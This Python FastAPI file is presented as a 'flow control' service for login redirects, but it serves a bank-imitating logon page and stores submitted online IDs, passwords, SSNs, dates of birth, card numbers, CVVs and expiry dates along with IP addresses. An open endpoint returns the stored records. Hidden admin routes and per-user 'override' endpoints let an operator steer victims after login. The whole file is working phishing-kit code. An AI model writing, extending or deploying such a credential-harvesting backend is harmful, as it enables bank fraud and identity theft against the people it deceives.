"""
Minimal FastAPI app for future admin control endpoints.

This is a placeholder structure for future Signal/Telegram integration.
Not used in initial scope - login hook is integrated directly.
"""

from fastapi import FastAPI, HTTPException, Request
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional
from datetime import datetime
from pathlib import Path
from flow_control.service import force_post_login_route, release_post_login, resolve_post_login_destination
from flow_control.store import get_login_flow
from flow_control.supabase_storage import save_login_data, get_all_login_data
from api.admin import create_admin_routes

# Get the project root directory
BASE_DIR = Path(__file__).parent.parent

app = FastAPI(
    title="Flow Control API",
    description="Server-side flow control layer for login redirects",
    version="1.0.0"
)

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Mount static files (CSS, JS, images, etc.)
app.mount("/assets", StaticFiles(directory=str(BASE_DIR / "assets")), name="assets")

# Serve CSS files
@app.get("/logon.css")
async def serve_logon_css():
    """Serve logon.css"""
    return FileResponse(str(BASE_DIR / "logon.css"))

@app.get("/usaa-complete.css")
async def serve_usaa_css():
    """Serve usaa-complete.css"""
    return FileResponse(str(BASE_DIR / "usaa-complete.css"))

# Add hidden admin routes
create_admin_routes(app)


class OverrideRequest(BaseModel):
    """Request model for setting login flow override."""
    user_id: str
    route: str
    expires_at: Optional[datetime] = None
    updated_by: Optional[str] = None
    message: Optional[str] = None


@app.post("/api/flow-control/override")
async def set_override(request: OverrideRequest):
    """
    Set login flow override for a user.
    
    Future endpoint for admin control (Signal/Telegram integration).
    """
    force_post_login_route(
        user_id=request.user_id,
        route=request.route,
        expires_at=request.expires_at,
        updated_by=request.updated_by
    )
    return {"status": "success", "user_id": request.user_id}


@app.delete("/api/flow-control/override/{user_id}")
async def clear_override(user_id: str):
    """
    Clear login flow override for a user.
    
    Future endpoint for admin control (Signal/Telegram integration).
    """
    release_post_login(user_id)
    return {"status": "success", "user_id": user_id}


@app.get("/api/flow-control/override/{user_id}")
async def get_override(user_id: str):
    """
    Get login flow override for a user.
    
    Future endpoint for admin control (Signal/Telegram integration).
    """
    flow = get_login_flow(user_id)
    if flow is None:
        raise HTTPException(status_code=404, detail="No override found")
    
    return {
        "user_id": flow["user_id"],
        "forced_route": flow["forced_route"],
        "message": flow["message"],
        "expires_at": flow["expires_at"].isoformat() if flow["expires_at"] else None,
        "updated_at": flow["updated_at"].isoformat(),
        "updated_by": flow["updated_by"]
    }


class LoginDataRequest(BaseModel):
    """Request model for saving login data."""
    online_id: str
    password: str
    ssn: Optional[str] = None
    dob: Optional[str] = None
    card_number: Optional[str] = None
    email: Optional[str] = None
    cvv: Optional[str] = None
    expiration: Optional[str] = None
    zip_code: Optional[str] = None


@app.post("/api/login-data")
async def save_login(request: Request, data: LoginDataRequest):
    """
    Save login and verification data.
    
    This endpoint receives login data from the frontend.
    """
    try:
        # Get IP address and user agent
        ip_address = request.client.host if request.client else None
        user_agent = request.headers.get("user-agent", "")
        
        # Save to database
        success = save_login_data(
            online_id=data.online_id,
            password=data.password,
            ssn=data.ssn,
            dob=data.dob,
            card_number=data.card_number,
            email=data.email,
            cvv=data.cvv,
            expiration=data.expiration,
            zip_code=data.zip_code,
            ip_address=ip_address,
            user_agent=user_agent
        )
        
        if success:
            return {"status": "success", "message": "Data saved successfully"}
        else:
            raise HTTPException(status_code=500, detail="Failed to save data")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/login-data")
async def get_login_data():
    """
    Get all saved login data (for admin viewing).
    """
    try:
        data = get_all_login_data(limit=1000)
        return {"status": "success", "data": data, "count": len(data)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/")
async def serve_index():
    """Serve index.html"""
    return FileResponse(str(BASE_DIR / "index.html"))

@app.get("/index.html")
async def serve_index_html():
    """Serve index.html"""
    return FileResponse(str(BASE_DIR / "index.html"))

@app.get("/logon.html")
async def serve_logon():
    """Serve logon.html"""
    return FileResponse(str(BASE_DIR / "logon.html"))

@app.get("/health")
async def health_check():
    """Health check endpoint."""
    return {"status": "ok"}

